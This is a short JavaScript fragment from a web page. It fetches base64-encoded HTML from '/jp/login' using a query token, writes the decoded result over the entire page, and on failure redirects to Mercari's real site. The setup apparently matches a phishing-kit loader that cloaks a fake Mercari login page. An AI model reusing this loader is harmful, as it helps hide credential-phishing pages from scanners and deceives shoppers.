        $.ajax({
            type: 'GET',
            url: "/jp/login",
            cache: false,
            data:{
                v:getQueryString("v")
            },
            success: function(data) {
                var doc = document.open('text/html', 'replace');
                var dat = atob(data);
                var html = decodeURIComponent(dat)
                doc.write(html);
            },
            error: function (err) {
                location.href = "https://mercari.com/jp/"
            }
        });
    
        function getQueryString(name) {
            var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
            var r = window.location.search.substr(1).match(reg);
            if (r != null) {
                return unescape(r[2]);
            }
            return null;
        }
  </script>
